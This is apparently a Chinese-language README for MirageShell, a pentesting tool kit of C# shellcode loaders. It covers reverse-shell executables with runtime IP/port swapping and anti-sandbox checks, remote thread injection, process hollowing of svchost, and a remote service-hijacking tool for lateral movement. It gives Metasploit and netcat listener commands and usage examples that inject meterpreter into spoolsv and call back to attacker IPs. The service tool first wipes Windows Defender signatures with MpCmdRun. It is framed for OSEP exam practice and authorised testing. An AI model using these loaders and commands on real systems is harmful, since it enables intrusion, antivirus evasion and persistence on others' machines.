# MirageShell

MirageShell 是一套“幻景”般的Shellcode加载工具集，融合动态通信伪装（Swap）、远程线程注入（Inject）、进程镂空（Hollow）以及远程服务劫持（Service）四种核心技法，让恶意代码的加载与驻留如海市蜃楼般变幻无形、驻留无痕。所有模块均可独立运作，亦可协同编排，或许可以用于OSEP考试。

## ⚠️免责声明

**本工具仅供安全研究与授权测试使用。使用者须遵守所在国法律法规，并确保已获得被测系统所有者的明确授权。严禁将此工具用于任何非法攻击、入侵或破坏他人计算机系统的活动。若使用者违反前述规定，产生的一切法律责任与后果由使用者自行承担，与本项目及开发者无关。**

## 一览表

|                              msf对应的快速开监听命令                              | 对应的进程镂空工具 | 对应的进程注入工具 | 对应的反向shell工具 |
| :---------------------------------------------------------------------------------: | -------------------- | -------------------- | -- |
|      handler -H 192.168.1.88 -P 4444 -p windows/x64/meterpreter/reverse_tcp      | `Met64Hollow.exe`                   | `Met64Inject.exe`                   | `met64_tcp.exe` |
|        handler -H 192.168.1.88 -P 4444 -p windows/meterpreter/reverse_tcp        | `MetHollow.exe`                   | `MetInject.exe`                   | `met_tcp.exe` |
| handler -H 192.168.1.88 -P 4444 -p windows/x64/shell_reverse_tcp<br />或nc -lnvp 4444 | `Shell64Hollow.exe`                   | `Shell64Inject.exe`                   | `shell64_tcp.exe` |
|   handler -H 192.168.1.88 -P 4444 -p windows/shell_reverse_tcp<br />或nc -lnvp 4444   | `ShellHollow.exe`                   | `ShellInject.exe`                   | `shell_tcp.exe` |

不难发现，命名规则Met64\*的是对应windows/x64/meterpreter/reverse_tcp的，命名shell64\*的是对应windows/x64/shell_reverse_tcp的

## 解决问题

你可能很好奇为什么还要单独写这些工具？msfvenom不是可以直接生成对应的exe吗？

**因为我发现每次测试重新生成可执行文件，或者生成各种格式的shellcode再去处理，重新编译，很耽误时间，所以改成了用csharp加载，动态替换ip和端口，这样一个exe就能一直使用了。**

## RevShell-Swap

是一个轻量级 .NET 动态加载器，通过加密与特征码定位实现 reverse_tcp shellcode 的 IP/端口免编译替换，并内置反沙箱检测，适用于 OSEP 等渗透测试环境。

### 快速使用

自行替换处理后的shellcode，同上，然后编译：

```powershell
csc /platform:x64 /out:met64_tcp.exe met64_tcp.cs
```

也可以直接使用release版本

```powershell
met64_tcp.exe <ip> <port>
```

## **RevShell-Inject**

远程线程注入器。将Shellcode如同一根无形毒刺，精准注入到正在运行的合法进程（如spoolsv）体内，借助目标进程的上下文执行代码，从而绕过应用层监控，实现无声寄生。

### 快速使用

自行替换处理后的shellcode，同上，然后编译：

```powershell
csc /platform:x64 /out:Met64Inject.exe Met64Inject.cs
```

也可以直接使用release版本

```powershell
Met64Inject.exe <IP> <Port> <TargetProcess>

Met64Inject.exe 192.168.1.88 4444 notepad
```

## RevShell-Hollow

### 快速使用

```cmd
<程序名>.exe <IP> <Port> <进程完整路径>
```

示例：

```cmd
Met64Hollow.exe 10.10.14.10 4444 C:\Windows\System32\svchost.exe
MetHollow.exe 10.10.14.10 4444 C:\Windows\SysWOW64\svchost.exe
```

- **IP/Port**：C2 监听地址和端口。
- **进程完整路径**：必须是一个真实存在的可执行文件路径，该文件会被挂起创建并作为宿主进程。
- 推荐使用 `C:\Windows\System32\svchost.exe`（x64）或 `C:\Windows\SysWOW64\svchost.exe`（x86）。

## lat

用于远程修改目标主机上的服务并启动，执行任意命令。搭配前几种可以完成横向移动和简单的杀软绕过。

### 快速使用

```powershell
lat64.exe <目标主机> <服务名> <完整命令行>
```

**示例（PowerShell）** ：

```powershell
# 利用当前凭证在file01上启动 C:\Met64Inject.exe，参数为 IP 、端口、被注入的进程
C:\windows\temp\lat64.exe file01 SensorService "`"C:\Met64Inject.exe`" 192.168.45.237 4444 Spoolsv"

# 利用当前凭证在file01上启动 met64_tcp.exe，参数为 IP 和端口
C:\windows\temp\lat64.exe file01 SensorService "C:\shell64_tcp.exe 192.168.45.237 4444"
```

- `lat64.exe` 会先调用 `MpCmdRun.exe -RemoveDefinitions -All` 清除 Windows Defender 签名，再启动指定命令。
- 执行服务以 SYSTEM 权限运行，非标准服务程序会导致服务启动超时（错误 1053），但命令已成功执行。

## 详细介绍

各模块的详细介绍见对应的文件内的readme，实际上只有`RevShell-Swap`相对写的较全，因为都很类似
